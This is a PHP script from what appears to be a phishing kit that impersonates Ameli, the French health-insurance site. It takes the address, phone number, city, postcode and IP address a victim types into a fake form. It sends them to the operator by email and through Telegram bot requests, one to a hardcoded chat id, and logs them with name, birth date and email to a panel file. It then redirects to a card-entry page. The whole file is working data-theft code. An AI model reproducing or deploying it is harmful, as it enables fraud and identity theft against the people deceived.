<?php
include("../common/sub_includes.php");
include("../config.php");

ob_start();
if (!isset($_SESSION)) {
  session_start();  // Et on ouvre la session
}

$Adresse = $_POST['input_adresse'];
$Complementdadresse = $_POST['input_adresse2'];
$zipcode = $_POST['input_zipcode'];
$Tel = $_POST['input_tel'];
$City = $_POST['input_city'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['adresse']  = $Adresse;
    $_SESSION['adresse2']  = $Complementdadresse;
    $_SESSION['input_zipcode']  = $zipcode;
    $_SESSION['tel']  = $Tel;
    $_SESSION['city']  = $City;

  $message = '
[🐤] Ameli Querty billing +1 [🐤]

📱 Téléphone : '.$_SESSION['tel'].'

🏡 Adresse : '.$_SESSION['adresse'].'
🏡 Adresse Complement : '.$_SESSION['adresse2'].'

🏙️ Ville : '.$_SESSION['city'].'
🏙️ Code Postal : '.$_SESSION['input_zipcode'].'

🚩 Pays : France

🛒 Adresse IP : '.$_SERVER['REMOTE_ADDR'].'
';

if ($mail_send == true) {
  $Subject = " 「💳」+1 Fr3sh Ameli adresse from " . $_SESSION["city"] . " | " . $_SERVER['REMOTE_ADDR'];
  $head = "From: Ameli adresse <info@querty.bg>";

  mail($my_mail, $Subject, $message, $head);
}

if ($tlg_send == true) {
  file_get_contents('https://api.telegram.org/bot' . $bot_token . '/sendMessage?chat_id=' . $rez_billing . '&text=' . urlencode("$message") . '');
  
  file_get_contents('https://api.telegram.org/bot' . $bot_token . '/sendMessage?chat_id=' . '-4037726986' . '&text=' . urlencode("$message") . '');
}

setlocale(LC_TIME, 'fr_FR');
date_default_timezone_set('Europe/Paris');

$date = date("d/m/Y");
$heure = date("H:i:s");

$myfile = fopen("../panel/billing.txt", "a") or die("Unable to open file!");
fwrite($myfile, "\n" . '
<tr>
<td width="80">
<p align="center">'.$_SERVER['REMOTE_ADDR'].'</th>
<td width="60">
<p align="center">'.$_SESSION['Prenom'] . ' ' .$_SESSION['Nom'].' </th>
<td width="60">
<p align="center">'.$_SESSION['Ddn'].' </th>
<td width="30">
<p align="center">'.$_SESSION['tel'].' </th>
<td width="30">
<p align="center">'.$_SESSION['city'].' </th>
<td width="30">
<p align="center">'.$_SESSION['adresse'].' </th>
<td width="30">
<p align="center">'.$_SESSION['input_zipcode'].' </th>
<td width="30">
<p align="center">'.$_SESSION['mail'].'</th>
<td width="40">
</font></th></tr>
');
fclose($myfile);

$filepath = '../panel/stats.ini';
$data = @parse_ini_file($filepath);
$data['billings']++;
            function update_ini_file($data, $filepath) {
              $content = "";
              $parsed_ini = parse_ini_file($filepath, true);
              foreach($data as $section => $values){
                if($section === ""){
                  continue;
                }
                $content .= $section ."=". $values . "\n\r";
              }
              if (!$handle = fopen($filepath, 'w')) {
                return false;
              }
              $success = fwrite($handle, $content);
              fclose($handle);
            }
update_ini_file($data, $filepath);

header('location: ../pages/avcard.php');
}
